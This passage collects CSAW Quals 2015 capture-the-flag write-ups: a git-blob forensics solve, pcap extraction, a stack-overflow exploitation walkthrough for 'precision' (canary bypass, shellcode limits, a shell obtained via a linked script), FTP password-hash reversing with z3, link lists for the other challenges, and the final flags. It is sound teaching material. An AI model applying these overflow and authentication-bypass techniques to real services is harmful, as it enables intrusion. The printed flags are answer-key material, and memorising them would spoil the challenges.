'blob 520\x00#include <iostream>\n#include <string>\n#include <algorithm>\n\nusing namespace std;\n\nint main(int argc, char **argv)\n{\n\t(void)argc; (void)argv; //unused\n\n\tstd::string part1;\n\tcout << "Part1: Enter flag:" << endl;\n\tcin >> part1;\n\n\tint64_t part2;\n\tcout << "Part2: Input 31337:" << endl;\n\tcin >> part2;\n\n\tstd::string part3;\n\tcout << "Part3: Watch this: https://www.youtube.com/watch?v=PBwAxmrE194" << endl;\n\tcin >> part3;\n\n\tstd::string part4;\n\tcout << "Part4: C.R.E.A.M. Get da _____: " << endl;\n\tcin >> part4;\n\n\treturn 0;\n}\n\n'
```

Here's the output for the blob d961f81a588fcfd5e57bbea7e17ddae8a5e61333
```bash
VALID! 'd961f81a588fcfd5e57bbea7e17ddae8a5e61333'
'blob 806\x00#include <iostream>\n#include <string>\n#include <algorithm>\n\nusing namespace std;\n\nint main(int argc, char **argv)\n{\n\t(void)argc; (void)argv; //unused\n\n\tstd::string part1;\n\tcout << "Part1: Enter flag:" << endl;\n\tcin >> part1;\n\n\tint64_t part2;\n\tcout << "Part2: Input 31337:" << endl;\n\tcin >> part2;\n\n\tstd::string part3;\n\tcout << "Part3: Watch this: https://www.youtube.com/watch?v=PBwAxmrE194" << endl;\n\tcin >> part3;\n\n\tstd::string part4;\n\tcout << "Part4: C.R.E.A.M. Get da _____: " << endl;\n\tcin >> part4;\n\n\tuint64_t first, second;\n\tcout << "Part5: Input the two prime factors of the number 272031727027." << endl;\n\tcin >> first;\n\tcin >> second;\n\n\tuint64_t factor1, factor2;\n\tif (first < second)\n\t{\n\t\tfactor1 = first;\n\t\tfactor2 = second;\n\t}\n\telse\n\t{\n\t\tfactor1 = second;\n\t\tfactor2 = first;\n\t}\n\n\treturn 0;\n}\n\n'
```

Here's the output for the blob f8d0839dd728cb9a723e32058dcc386070d5e3b5
```bash
VALID! 'f8d0839dd728cb9a723e32058dcc386070d5e3b5'
'blob 1880\x00#include <iostream>\n#include <string>\n#include <algorithm>\n\n#include <stdint.h>\n#include <stdio.h>\n#include <openssl/sha.h>\n\nusing namespace std;\n\nstd::string calculate_flag(\n\t\tstd::string &part1, \n\t\tint64_t part2, \n\t\tstd::string &part4,\n\t\tuint64_t factor1,\n\t\tuint64_t factor2)\n{\n\n\tstd::transform(part1.begin(), part1.end(), part1.begin(), ::tolower);\n\tstd::transform(part4.begin(), part4.end(), part4.begin(), ::tolower);\n\n\tSHA_CTX ctx;\n\tSHA1_Init(&ctx);\n\n\tunsigned int mod = factor1 % factor2;\n\tfor (unsigned int i = 0; i < mod; i+=2)\n\t{\n\t\tSHA1_Update(&ctx,\n\t\t\t\treinterpret_cast<const unsigned char *>(part1.c_str()),\n\t\t\t\tpart1.size());\n\t}\n\n\n\twhile (part2-- > 0)\n\t{\n\t\tSHA1_Update(&ctx,\n\t\t\t\treinterpret_cast<const unsigned char *>(part4.c_str()),\n\t\t\t\tpart1.size());\n\t}\n\n\tunsigned char *hash = new unsigned char[SHA_DIGEST_LENGTH];\n\tSHA1_Final(hash, &ctx);\n\n\tstd::string rv;\n\tfor (unsigned int i = 0; i < SHA_DIGEST_LENGTH; i++)\n\t{\n\t\tchar *buf;\n\t\tasprintf(&buf, "%02x", hash[i]);\n\t\trv += buf;\n\t\tfree(buf);\n\t}\n\n\treturn rv;\n}\n\nint main(int argc, char **argv)\n{\n\t(void)argc; (void)argv; //unused\n\n\tstd::string part1;\n\tcout << "Part1: Enter flag:" << endl;\n\tcin >> part1;\n\n\tint64_t part2;\n\tcout << "Part2: Input 31337:" << endl;\n\tcin >> part2;\n\n\tstd::string part3;\n\tcout << "Part3: Watch this: https://www.youtube.com/watch?v=PBwAxmrE194" << endl;\n\tcin >> part3;\n\n\tstd::string part4;\n\tcout << "Part4: C.R.E.A.M. Get da _____: " << endl;\n\tcin >> part4;\n\n\tuint64_t first, second;\n\tcout << "Part5: Input the two prime factors of the number 272031727027." << endl;\n\tcin >> first;\n\tcin >> second;\n\n\tuint64_t factor1, factor2;\n\tif (first < second)\n\t{\n\t\tfactor1 = first;\n\t\tfactor2 = second;\n\t}\n\telse\n\t{\n\t\tfactor1 = second;\n\t\tfactor2 = first;\n\t}\n\n\tstd::string flag = calculate_flag(part1, part2, part4, factor1, factor2);\n\tcout << "flag{";\n\tcout << flag;\n\tcout << "}" << endl;\n\n\treturn 0;\n}\n\n'
```

So, to get the flag, the sharp.cpp file needs to have the following:
```bash
"Part2: Input 31337:"
"Part5: Input the two prime factors of the number 272031727027."
```

Replace and save the file (You can find the fixed and edited sharp.cpp in the repo).

Now, with Wolfram|Alpha, search : prime factors of 272031727027:

```bash
31357
8675311
```

Now, compile sharp.cpp and run it to get the flag. (You need the libssl-dev package to use the openssl/sha.h library):
```bash
$ g++ sharp.cpp -L/usr/lib -lssl -lcrypto -o sharp    
$ ./sharp
```

The flag:
```bash
flag{3b532e0a187006879d262141e16fa5f05f2e6752}
```


## Other write-ups and resources

* <https://cclub.cs.wmich.edu/planet/2015/09/21/csaw-2015-sharpturn.html>
* <https://systemoverlord.com/blog/csaw-quals-2015-sharpturn-aka-forensics-400/>
* <http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-for400-sharpturn/>
* <https://github.com/hypnosec/writeups/blob/master/2015/csaw-ctf/forensics/sharpturn.md>
* <http://nandynarwhals.org/2015/09/21/csaw-2015-sharpturn-forensics-400/>
* <https://github.com/thehobn/sharpturn>
* <http://blog.bitsforeveryone.com/2015/09/writeup-csaw-2015-sharpturn.html>
* <http://conorpp.com/blog/how-to-fix-a-corrupted-file-by-brute-force/>
* <http://khack40.info/csaw-ctf-2015-sharpturn-forensic-write-up/> (French)
* <http://blog.isis.poly.edu/2015/10/03/csaw-ctf-sharpturn.html>
# CSAW QUALS 2015: transfer-100

**Category:** Forensics
**Points:** 100
**Solves:** 541
**Description:**

> I was sniffing some web traffic for a while, I think i finally got something interesting. Help me find flag through all these packets.
>
> [net_756d631588cb0a400cc16d1848a5f0fb.pcap](net_756d631588cb0a400cc16d1848a5f0fb.pcap)

## Write-up

by [polym](https://github.com/abpolym)

We are given a pcap that we open with `wireshark`:

![](./wireshark.png)

We see a bunch of TCP, TLSv1.2, HTTP and SSL packets:

```bash
$ tshark -r net_756d631588cb0a400cc16d1848a5f0fb.pcap  | awk '{print $7}' | sort | uniq -c | sort -n
  56 SSL
  89 HTTP
 508 TLSv1.2
1585 TCP
```

Searching for the string `flag`, we see something interesting:

```bash
$ strings net_756d631588cb0a400cc16d1848a5f0fb.pcap | grep -i flag
FLAG = 'flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}'
print encode(FLAG, cnt=?)o
```

Let's find that string using wireshark:

![](./wireshark-search.png)

Looks like some sort of python script was transferred.
We can extract that python script using the `TCP follow` feature of wireshark.

`Analyze -> Follow -> TCP Stream`:

![](wireshark-follow.png)

Save it as [transfer.py](./transfer.py), fix some intendation issues and comment out the base64 encoded rest of the TCP stream conversation.

The last steps are writing a decode function (look at some other writeups) to receive the flag: `flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}`.

## Other write-ups and resources

* <https://p4f.github.io/csaw-online-qual-forensics100/>
* <https://github.com/hypnosec/writeups/blob/master/2015/csaw-ctf/forensics/transfer.md>
* <https://github.com/ViviTurtle/Programming/tree/master/Competitions/CSAW_2015/Transfer>
* <https://djekmani.github.io/posts/CSAW2015-writeup-transfer-forensics/>
* <https://ctftime.org/writeup/1675>
* <http://kikisctf.blogspot.hr/2015/09/csaw-2015-quals-forensic-100-transfer.html>
* <http://blog.isis.poly.edu/2015/10/03/csaw-ctf-transfer.html>
* <https://github.com/ByteBandits/writeups/blob/master/csaw-quals-2015/forensics/transfer/sudhackar/README.md>
# CSAW QUALS 2015: autobots-350

**Category:** Pwn
**Points:** 350
**Solves:** 65
**Description:**

> I hear bots are playing ctfs now.
>
> Note: Aslr has now been disabled for this challenge
>
> `nc 54.86.195.190 8888`
>
>


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/csaw-quals-2015-autobots/>
* [http://bruce30262.logdown.com/posts/301623-csaw-ctf-2015-autobots](http://bruce30262.logdown.com/posts/301623-csaw-ctf-2015-autobots)
* <http://trich.im/?p=74>
* <https://www.pawpetersen.dk/csaw-ctf-qualification-round-2015-autobots/>
* <http://blog.techorganic.com/2015/09/21/csaw-ctf-quals-2014-autobots-writeup/>
* <https://github.com/four0four/writeups-public/blob/master/csawq-2015/pwn350-autobots.md>
* <http://toh.necst.it/csaw2015/exploitables/Autobots/>
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/09/23/144438)
# CSAW QUALS 2015: contacts-250

**Category:** Pwn
**Points:** 250
**Solves:** 101
**Description:**

> nc 54.208.16.165 2555
>
> [contacts_54f3188f64e548565bc1b87d7aa07427](contacts_54f3188f64e548565bc1b87d7aa07427)


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/csaw-quals-2015-contacts/>
* <https://www.whitehatters.academy/csaw-2015-prequals-exploit-250-contacts/>
* <http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/pwn/contacts>
* <http://blog.isis.poly.edu/2015/09/28/csaw-ctf-contacts.html>
* <http://v0ids3curity.blogspot.de/2015/09/csaw-ctf-exploitables250-contacts.html>
* [French](https://github.com/t00sh/tosh-codes/blob/master/content/CTF/csaw_preq2015_exploit250.md)
* [Korean](http://trich.im/?p=74)
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/09/23/144438)
* <https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_quals_2015/pwn250_contacts_sploit.py>
# CSAW QUALS 2015: ftp-2-300

**Category:** Pwn
**Points:** 300
**Solves:** 124
**Description:**

> This challenge is a follow up to FTP, now exploit the service.


## Write-up

(TODO)

## Other write-ups and resources

* [http://bruce30262.logdown.com/posts/301425-csaw-ctf-2015-ftp](http://bruce30262.logdown.com/posts/301425-csaw-ctf-2015-ftp)
* <http://www.incertia.net/blog/csaw-ctf-quals-2015-re300pwn300ftpftp2/>
* <http://blog.bitsforeveryone.com/2015/09/writeup-csaw-2015-exploitables-300-ftp2.html>
* <http://www.mrt-prodz.com/blog/view/2015/09/csaw-2015---ftp-2---exploitables-300pts-writeup>
* <https://github.com/p4-team/ctf/tree/master/2015-09-16-csaw/pwn_300_ftp2#eng-version>
* <http://v0ids3curity.blogspot.de/2015/09/csaw-ctf-exploitables300-ftp.html>
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/09/23/144438)
* [Polish](http://forum.4programmers.net/Spolecznosc/259018-writeup_csaw_ctf_2015)
# CSAW QUALS 2015: meme-shop-400

**Category:** Pwn
**Points:** 400
**Solves:** 56
**Description:**

> only dwn knows what the meme is!
> pwn this service to find out what only he knows!
>
> dwn: please tell us the meme....
>
> `nc 54.164.173.236 1337`
>
>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/numinit/CTF/blob/master/CSAW-2015/memeshop.md>
* <http://bitsforeveryone.blogspot.com/2015/09/writeup-csaw-2015-exploitation-400.html>
* <https://kitctf.de/writeups/csaw-2015/memeshop/>
* [Japanese](https://193s.github.io/blog/2015/09/23/csaw-ctf-2015-writeup/)
* <http://trich.im/?tag=exploit>
* <https://github.com/crowell/memeshop>
# CSAW QUALS 2015: precision-100

**Category:** Pwn
**Points:** 100
**Solves:** 272
**Description:**

> nc 54.210.15.77 1259
>
> Updated again!
>
> [precision_a8f6f0590c177948fe06c76a1831e650](precision_a8f6f0590c177948fe06c76a1831e650)


## Write-up

by [polym](https://github.com/abpolym)

This writeup is loosely based on following writeups:

* <https://ctf-team.vulnhub.com/csaw-quals-2015-precision/>
* <https://www.youtube.com/watch?v=0TWlW5MBnKE>
* <http://kikisctf.blogspot.hr/2015/09/csaw-2015-quals-exploitable-100.html>
* <http://blog.isis.poly.edu/2015/09/28/csaw-ctf-precision.html>

### Meta

Vulnerability:

* Stack Overflow via `__isoc99_scanf`
* Self-made canary

We are given an 32 bit ELF for Linux i386:

```bash
$ file precision_a8f6f0590c177948fe06c76a1831e650
precision_a8f6f0590c177948fe06c76a1831e650: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=929fc6f283d6f6c3c039ee19bc846e927103ebcd, not stripped
```

Running it:

```bash
$ ./precision_a8f6f0590c177948fe06c76a1831e650
Buff: 0xff801988
hello
Got hello
```

Sweet, a stack address!

We can provide input to the binary, lets test it for a stack overflow vulnerability:

```bash
$ python -c 'print "A"*512' | tee in | ./precision_a8f6f0590c177948fe06c76a1831e650
Buff: 0xffd7b798
Nope
```

So it looks like we did trigger something else.

Our next step is looking at the available functions in [radare2](https://github.com/radare/radare2):

```bash
$ r2 precision_a8f6f0590c177948fe06c76a1831e650 
 -- Don't look at the code. Don't look.
[0x08048420]> aa
[0x08048420]> afl | sort -k1 | column -t
0x0804837c  35   3  sym._init
0x080483b0  16   2  sym.imp.printf
0x080483c0  16   2  sym.imp.puts
0x080483d0  16   2  loc.imp.__gmon_start__
0x080483e0  16   2  sym.imp.exit
0x080483f0  16   2  sym.imp.__libc_start_main
0x08048400  16   2  sym.imp.setvbuf
0x08048410  16   2  sym.imp.__isoc99_scanf
0x08048420  34   1  entry0
0x08048450  4    1  sym.__x86.get_pc_thunk.bx
0x08048460  42   4  sym.deregister_tm_clones
0x08048490  55   4  sym.register_tm_clones
0x080484d0  30   3  sym.__do_global_dtors_aux
0x080484f0  45   4  sym.frame_dummy
0x0804851d  187  4  sym.main
0x080485e0  97   4  sym.__libc_csu_init
0x08048650  2    1  sym.__libc_csu_fini
0x08048654  20   1  sym._fini
```

Looks like the binary consists of only `main`.

NOTE: `imp` are imported functions from a library and between `sym.__libc_csu_init` and `sym.frame_dummy` there is only one function, `main`.

We decompile it using `radare2`'s `pdf` command:

![](./main.png)

If we reverse the binary, we get [this pseudo C-code](./precision-pseudo.c).

The main things to notice here are two things:

* There is a self-made canary that loads static 8 byte as a floating number from `0x8048690` to `esp+0x98` before calling `__isoc99_scanf` and compares the values after the call
* Since there essentially is no limit of characters that we can provide as input, we can smash the stack - a classic stack overflow vulnerability

To get a shell, we have to do following steps:

* Set the right bytes at `esp+0x98`
* Find or craft shellcode that works for `__isoc99_scanf` - e.g. `pwntool`'s [`shellcraft.i386.linux.sh()`](http://pwntools.readthedocs.org/en/latest/shellcraft/i386.html#pwnlib.shellcraft.i386.linux.sh) won't work, since it contains a `0xb`, which is a whitecharacter and triggers `__isoc99_scanf` to stop reading!
* Find the right offset to get control over `EIP` and overwrite it with the leaked stack address (in our case the address of our buffer)

NOTE: To craft the shellcode, I pasted the hex representation of my shellcode (`xxd -p in` , then copy only the shellcode part) to [ODA](https://www.onlinedisassembler.com/odaweb/) and searched for needed opcodes and instructions in the given binary using `radare2`.

[This python code](./solve.py) does the job:

```bash
$ python solve.py 
[+] Started program './precision_a8f6f0590c177948fe06c76a1831e650'
[*] Leaked Stack Addr: ffcb40f8
[*] Enjoy your shell :)!
[*] Switching to interactive mode
$ ls flag
flag
$ cat flag
flag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}
```

The flag is `flag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}`!

If you need more information or futher clarification, read the other writeups, look at the documented code or debug the binary with the exploit code `in` step by step in [gdb-peda](https://github.com/longld/peda). Or just [create an issue](https://github.com/ctfs/write-ups-2015/issues) explaining what exactly you don't understand!

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/csaw-quals-2015-precision/>
* <http://www.securifera.com/blog/2015/09/22/csaw-2015-precision/>
* <https://www.whitehatters.academy/csaw2015-quals-precision-exploit-100/>
* <http://blog.init-labs.org/2015/09/22/csaw-pwn-100-write-up/>
* <http://kikisctf.blogspot.hr/2015/09/csaw-2015-quals-exploitable-100.html>
* <http://blog.isis.poly.edu/2015/09/28/csaw-ctf-precision.html>
* <https://github.com/ByteBandits/writeups/blob/master/csaw-quals-2015/pwn/precision/sudhackar/README.md>
* <https://www.youtube.com/watch?v=0TWlW5MBnKE>
* <https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_quals_2015/pwn100_precision_sploit.py>
# CSAW QUALS 2015: rhinoxorus-500

**Category:** Pwn
**Points:** 500
**Solves:** 0
**Description:**

> `nc 54.175.160.194 24242`
>
> Source has been released for this challenge.
>
> [rhinoxorus_cd2be6030fb52cbc13a48b13603b9979](rhinoxorus_cd2be6030fb52cbc13a48b13603b9979)
> [rhinoxorus.c](rhinoxorus.c)
>
>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_quals_2015/pwn500_rhinoxorous_sploit.py>
* [Polish](https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/pwn_500_rhinoxorus/README.md)
* [Korean](http://yum3.tistory.com/40)
# CSAW QUALS 2015 CTF write-ups

* <https://ctf.isis.poly.edu/>
* [Scoreboard](https://ctf.isis.poly.edu/scoreboard) or [local alternative](score.txt)

## Completed write-ups

* [crypto/notesy-100](crypto/notesy-100)
* [crypto/zer0-day-50](crypto/zer0-day-50)
* [forensics/airport-200](forensics/airport-200)
* [forensics/flash-100](forensics/flash-100)
* [forensics/keep-calm-and-ctf-100](forensics/keep-calm-and-ctf-100)
* [forensics/sharpturn-400](forensics/sharpturn-400)
* [forensics/transfer-100](forensics/transfer-100)
* [pwn/precision-100](pwn/precision-100)
* [reverse/ftp-300](reverse/ftp-300)

## External write-ups only

* [crypto/bricks-of-gold-500](crypto/bricks-of-gold-500)
* [crypto/ones_and_zer0s-50](crypto/ones_and_zer0s-50)
* [crypto/punchout-200](crypto/punchout-200)
* [crypto/whiter0se-50](crypto/whiter0se-50)
* [forensics/pcapin-150](forensics/pcapin-150)
* [pwn/autobots-350](pwn/autobots-350)
* [pwn/contacts-250](pwn/contacts-250)
* [pwn/ftp-2-300](pwn/ftp-2-300)
* [pwn/meme-shop-400](pwn/meme-shop-400)
* [pwn/rhinoxorus-500](pwn/rhinoxorus-500)
* [recon/alexander-taylor-100](recon/alexander-taylor-100)
* [recon/eric-liang-100](recon/eric-liang-100)
* [recon/julian-cohen-100](recon/julian-cohen-100)
* [reverse/hacking-time-200](reverse/hacking-time-200)
* [reverse/wyvern-500](reverse/wyvern-500)
* [trivia/trivia-1](trivia/trivia-1)
* [trivia/trivia-2](trivia/trivia-2)
* [trivia/trivia-3](trivia/trivia-3)
* [trivia/trivia-4](trivia/trivia-4)
* [trivia/trivia-5](trivia/trivia-5)
* [trivia/trivia-6](trivia/trivia-6)
* [web/K_achieve-200](web/K_achieve-200)
* [web/K_stairs-100](web/K_stairs-100)
* [web/lawn-care-stimulator-200](web/lawn-care-stimulator-200)
* [web/throwback-600](web/throwback-600)
* [web/weebdate-500](web/weebdate-500)

## Missing write-ups# CSAW QUALS 2015: alexander-taylor-100

**Category:** Recon
**Points:** 100
**Solves:** 424
**Description:**

> http://fuzyll.com/csaw2015/start


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/csaw-quals-2015-fuzyll/>
* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-recon-trivia.html>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Recon/Alexander-Taylor>
* <http://ctf-for-beginners.blogspot.com/2015/09/write-up-csaw-ctf-2015-recon-alexander.html>
* <https://github.com/ViviTurtle/Programming/tree/master/Competitions/CSAW_2015/Alexander%20Taylor>
* <http://thekillingtime.com/?p=319>
* <https://github.com/p4-team/ctf/tree/master/2015-09-16-csaw/recon_100_alexander_taylor>
* <http://blog.isis.poly.edu/2015/09/21/csaw-ctf-alexander-taylor.html>
* <https://github.com/ByteBandits/writeups/blob/master/csaw-quals-2015/recon/alexander-taylor/chaitan94/README.md>
# CSAW QUALS 2015: eric-liang-100

**Category:** Recon
**Points:** 100
**Solves:** 55
**Description:**

> Eric played ctfs with some friends a while ago.
>
> Hint: I remember playing with them around 2014... err maybe 2013?
>
> Hint: flag is in flag{} format
>
> Hint: The flag can be found on a .edu website
> 
>


## Write-up

(TODO)

## Other write-ups and resources

* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-recon-trivia.html>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Recon/Eric-Liang>
* <http://blog.bitsforeveryone.com/2015/09/writeup-csaw-2015-recon-100-eric-liang.html>
# CSAW QUALS 2015: julian-cohen-100

**Category:** Recon
**Points:** 100
**Solves:** 883
**Description:**

> Julian Cohen


## Write-up

(TODO)

## Other write-ups and resources

* <http://fadec0d3.blogspot.com/2015/09/csaw-2015-recon-trivia.html>
* <https://p4f.github.io/csaw-online-qual-forensics100/>
* <https://github.com/Alpackers/CTF-Writeups/tree/master/2015/CSAW-CTF/Recon/Julian-Cohen>
* <http://ctf-for-beginners.blogspot.com/2015/09/write-up-csaw-ctf-2015-recon-julian.html>
* <https://github.com/ViviTurtle/Programming/tree/master/Competitions/CSAW_2015/Julian%20Cohen>
* <https://github.com/p4-team/ctf/tree/master/2015-09-16-csaw/recon_100_julian_cohen>
* <https://www.youtube.com/watch?v=2zCjUVuhLmk>
# CSAW QUALS 2015: ftp-300

**Category:** Reversing
**Points:** 300
**Solves:** 214
**Description:**

> We found an ftp service, I'm sure there's some way to log on to it.
>
> nc 54.172.10.117 12012
>
> [ftp_0319deb1c1c033af28613c57da686aa7](ftp_0319deb1c1c033af28613c57da686aa7)
>
>


## Write-up

by [polym]()

Keywords:

* Hardcoded Credentials
* x86-64 Linux
* Custom Authentication Algorithm

We are given a x86-64 Binary for Linux:

```
$ file ftp_0319deb1c1c033af28613c57da686aa7 
ftp_0319deb1c1c033af28613c57da686aa7: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=43afbcd9f4e163f002970b9e69309ce0f1902324, stripped
```

Running the binary:

```
$ ./ftp_0319deb1c1c033af28613c57da686aa7 
[+] Creating Socket
[+] Binding
[+] Listening
[+] accept loop
```

The binary starts a FTP server, which port we can read by calling the binary with `ltrace` 

```
[pid 4082] __libc_start_main(0x402d2e, 1, 0x7ffff73eda88, 0x402ed0 <unfinished ...>
[pid 4082] signal(SIGALRM, 0x402d19)                                                                                                                                                                                          = 0
[pid 4082] puts("[+] Creating Socket")                                                                                                                                                                                        = 20
[pid 4082] socket(2, 1, 0)                                                                                                                                                                                                    = 3
[pid 4082] puts("[+] Binding")                                                                                                                                                                                                = 12
[pid 4082] bzero(0x7ffff73ed970, 16)                                                                                                                                                                                          = <void>
[pid 4082] htons(0x2eec, 16, 16, 0)                                                                                                                                                                                           = 0xec2e
[pid 4082] htons(0, 16, 16, 0)                                                                                                                                                                                                = 0
[...]
```

The port is `0x2eec` or `12012`, so we connect to the service with `nc` to verify that we deal with a FTP server:

```
$ nc localhost 12012
Welcome to FTP server
HELP
USER PASS PASV PORT
NOOP REIN LIST SYST SIZE
RETR STOR PWD CWD
USER test
Please send password for user test
PASS test
Invalid login credentials
```

Looks like we have to find out how to login / authenticate ourselves.

To do so, we open radare2 in visual mode and press `_` to get all [flags to strings](https://radare.gitbooks.io/radare2book/content/visual_mode/visual_disassembly.html#the-flagcommentfunctions-hud) in order to jump to them:

![](./invalid.png)

We jump to the string itself

![](./invalid-2.png)

As we can see, a function named `sub.memset_59b` uses this string (see the red XREF), so we jump to the calling function with `x` and subsequently go back into visual mode to see the following graph:

![](./memset_59b.png)

As we can see, to get to the node `0x40175a`, we have to pass the compares in both nodes `0x4016fa` and `0x401740`.

In the first one, we see that the `USER` is `blankwall`, so we guess that the second node `0x401740` is the function which compares or hashes the `PASS` argument, which should result in `0xd386d209`.

Let's jump to `fcn.00401540` by pressing `gj` (j is the character in the red brackets to the right of the call):

![](./fcn.00401540.png)

Turn out this is a multiplicative hash function [1](https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/reversing/ftp) [2](https://www.strchr.com/hash_functions) on our password (stored in `rdi` and `rbp-0x18`) with initial value of `0x1505` (stored in `rbp-0x4`) and multiplicative value of `0x21` (2^5+1 because of `shl` and the following `add`).

Note that there is modular reduction, meaning that the result stored in `rbp-0x4` is always modulo 2^5, since the `shl eax, 0x5` stores the result as a `DWORD` in `rax` and [nulling the higher 32bits doing so](http://stackoverflow.com/questions/11177137/why-do-most-x64-instructions-zero-the-upper-part-of-a-32-bit-register) [2](http://stackoverflow.com/questions/25455447/x86-64-registers-rax-eax-ax-al-overwriting-full-register-contents?lq=1) [3](http://x86asm.net/articles/x86-64-tour-of-intel-manuals/).

So in total, the python-equivalent of this function is ([source](https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/reversing/ftp)):

```
def hashf(inp):
    # Multiplier
    M = 0x21
    # Modulus
    P = 2**32
    # Initial state
    state = 0x1505
    for c in inp:
        state = ((state * M) + ord(c)) % P
    return state
```

We can then use the [Z3 theorem prover](https://github.com/Z3Prover/z3) to find out the correct `inp`ut, since we have all of our constraints stated in the above function.

I tried to solve this keygen on my own using `z3` at first, however I could not get it to work at first. Passwords that matched the hash did lead to the increasingly hated response `Invalid login credentials`.

After reading the writeups mentioned below, I confirmed that I did not miss anything (higher 32 bits are cleared on each mov 32 bit to 64 bit register, shl did zero out higher 32 bits and more special cases checks).
This was done by attaching `gdb-peda` to the child process spawned by the ftp server:

* Start the ftp server
* Run `ps aux | grep ftp`, write down the father pid
* Run `nc localhost 12012` and `ps aux | grep ftp`, write down the child pid
* Attach to the process using `sudo gdb ./ftp_0319deb1c1c033af28613c57da686aa7 -p <child_pid>` ([Note that you need sudo](https://sourceware.org/gdb/onlinedocs/gdb/Attach.html))
* Set a breakpoint to the beginning of the loop inside the hashing function (`0x00401582`)
* Enter `USER blankwall` and `PASS 0123456789` and step through the program, confirming that the registers stay <= `0xffffffff` and higher 32 bits are zeroed out

Then I tried to minimalize some z3 scripts I found in those writeups and finally found the bug in z3 (or maybe its intended): Even though I constraint the value of my BitVector `x` to be printable characters (between `0x20` and `0x7a`), I still have to AND (`&`) the value beforehand with `0xff`. Weird!

The [resulting script](./z3-solve.py) then gave me a password to login with:

```bash
$ python2.7 solve.py 
FTP password is [dNokie]
$ nc localhost 12012
Welcome to FTP server
USER blankwall
Please send password for user blankwall
PASS dNokie
logged in
HELP
USER PASS PASV PORT
NOOP REIN LIST SYST SIZE
RETR STOR PWD CWD
CWD
directory changed successfully
PWD

NOOP
NOOP ok
LIST
use port or pasv first

Command Not Found :(
^C
```

The final step was to find a hidden command not listed when typing in `HELP`.

This is easily done by searching for the string `flag` in the flags to find the String-flag `str.Error_reading_RE_flag_please_contact_an_organizer` and consequently do the same as done in the beginning of this writeup.

We first land in this function:

![](./rdf1.png)

We jump to the caller (`sub.alarm_673`) to find a hidden command, `RDF`:

![](./rdf2.png)

We then can execute this command to get the flag:

```
$ nc localhost 12012
Welcome to FTP server
USER blankwall
Please send password for user blankwall
PASS cookie
logged in
RDF
flag{n0_c0ok1e_ju$t_a_f1ag_f0r_you}
```


## Other write-ups and resources

* [http://bruce30262.logdown.com/posts/301425-csaw-ctf-2015-ftp](http://bruce30262.logdown.com/posts/301425-csaw-ctf-2015-ftp)
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/reversing/ftp>
* <http://capturetheswag.blogspot.com.au/2015/09/csaw-2015-quals-ftp-re300-challenge.html>
* <https://b01lers.net/challenges/CSAW%202015/FTP/69/>
* <https://wiremask.eu/writeups/csaw-ctf-2015-reverse-300-ftp/>
* <https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_quals_2015/re300_ftp_sploit.py>
# CSAW QUALS 2015: hacking-time-200

**Category:** Reversing
**Points:** 200
**Solves:** 180
**Description:**

> We're getting a transmission from someone in the past, find out what he wants.
>
> [HackingTime_03e852ace386388eb88c39a02f88c773.nes](HackingTime_03e852ace386388eb88c39a02f88c773.nes)


## Write-up

(TODO)

## Other write-ups and resources

* [http://bruce30262.logdown.com/posts/301384--csaw-ctf-2015-hacking-time](http://bruce30262.logdown.com/posts/301384--csaw-ctf-2015-hacking-time)
* <https://gist.github.com/ocean1/4efba4e84365b58b1e87>
* [http://tomasuh.github.io/2015/09/25/CSAW.html](http://tomasuh.github.io/2015/09/25/CSAW.html)
* <https://b01lers.net/challenges/CSAW%202015/NES/62/>
# CSAW QUALS 2015: wyvern-500

**Category:** Reversing
**Points:** 500
**Solves:** 96
**Description:**

> There's a dragon afoot, we need a hero. Give us the dragon's secret and we'll give you a flag.
>
> HINT: static is only 1 of 2 methods to RE. IDA torrent unnecessary
>
> [wyvern_c85f1be480808a9da350faaa6104a19b](wyvern_c85f1be480808a9da350faaa6104a19b)
>
>


## Write-up

(TODO)

## Other write-ups and resources

* <http://www.mathyvanhoef.com/2015/09/csaw-ctf-solving-reversing-wyvern-500.html>
* [http://bruce30262.logdown.com/posts/301490-csaw-ctf-2015-wyvern](http://bruce30262.logdown.com/posts/301490-csaw-ctf-2015-wyvern)
* <http://ohaithe-re.tumblr.com/post/129657401392/csaw-quals-2015-reversing-500-wyvern>
* <https://github.com/angr/angr-doc/blob/master/examples/csaw_wyvern/solve.py>
* <http://blog.init-labs.org/2015/09/22/csaw-rev-500-write-up/>

# CSAW QUALS 2015: trivia-1

**Category:** Trivia
**Points:** 10
**Solves:** 729
**Description:**

> This family of malware has gained notoriety after anti-virus and threat intelligence companies claimed that it was being used by several Chinese military groups.


## Write-up

(TODO)

## Other write-ups and resources

